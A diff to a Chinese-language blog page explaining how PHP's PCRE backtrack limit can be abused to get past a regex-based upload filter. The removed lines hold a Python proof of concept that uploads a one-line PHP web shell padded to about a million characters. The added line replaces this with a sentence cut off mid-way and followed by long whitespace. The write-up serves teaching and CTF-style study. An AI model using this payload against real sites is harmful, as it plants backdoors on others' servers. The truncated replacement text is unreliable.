@@ -355,7 +355,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          842 字
+          458 字
         
       </span>
     
@@ -366,7 +366,7 @@
         
         
         
-          8 分钟
+          4 分钟
         
       </span>
     
@@ -454,14 +454,7 @@
 <p>假设输入的是&lt;?php phpinfo();&#x2F;&#x2F;aaaaa，那么实际执行的流程是这样的</p>
 <p><img src="/2026/06/03/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87waf/image-20260603200459935.png" srcset="/img/loading.gif" lazyload alt="image-20260603200459935"></p>
 <p>见第4步，第一关.*可以匹配任意字符，所以最终能够匹配到输入串的结尾，就是&#x2F;&#x2F;aaaaa，但这里是不对的，因为第一关.*后面还应该有[(&#96;;?&gt;]字符去匹配</p>
-<p>所以这里NFA就开始回溯，先匹配到输入串结尾的前一位，即少匹配一个a，如第5步显示，但仍然匹配不上正则，所以还要继续少匹配一个a，依次类推，直到只匹配到&lt;?php phpinfo()，此时.*匹配的是php phpinfo()，现在后面的;就能匹配上[(&#96;;?&gt;]，这样就满足正则表达式的要求，于是不再回溯了，见12步。于是从13步开始就正常向后匹配;，14步又匹配上了.*，这是第二个.*，匹配到了字符串末尾，最后结束匹配</p>
-<p>也就是说从5~13步是在回溯的，这里回溯了8次。</p>
-<p>简单总结一下，这个回溯机制就是在正常匹配情况下，出现了提前结束匹配，比如.*这种直接匹配到了字符串末尾，则会一个一个字符串的取消匹配直到能正确匹配下一个正则表达。</p>
-<h1 id="pcre-backtrack-limit限制利用"><a href="#pcre-backtrack-limit限制利用" class="headerlink" title="pcre.backtrack_limit限制利用"></a>pcre.backtrack_limit限制利用</h1><p>PHP为了防止正则表达式的拒绝服务攻击（DOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，这里可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式来查看当前环境下的上限</p>
-<p>回溯次数上限默认是100万，所以果次数超过了100万，preg_match返回的是false，表示这次执行失败了，我们可以调用<code>var_dump(preg_last_error() === preg_backtrack_limit_error);</code>来探查失败的原因（一般都是回溯超出了限制</p>
-<p>所以针对上述示例代码，我们可以通过发送超长字符串的方式，使正则执行失败，最后绕过，针对上述代码的poc</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;&#123;url&#125;/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure>
-
+<p>所以这里NFA就开始回溯，先匹配到输入串结尾的前一位，即少匹配一个a，如第5步显示，但仍然匹配不上正则，所以还要继续少匹配一个a，依次类推，直到只匹配到&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             </p>
 
                 
               </div>
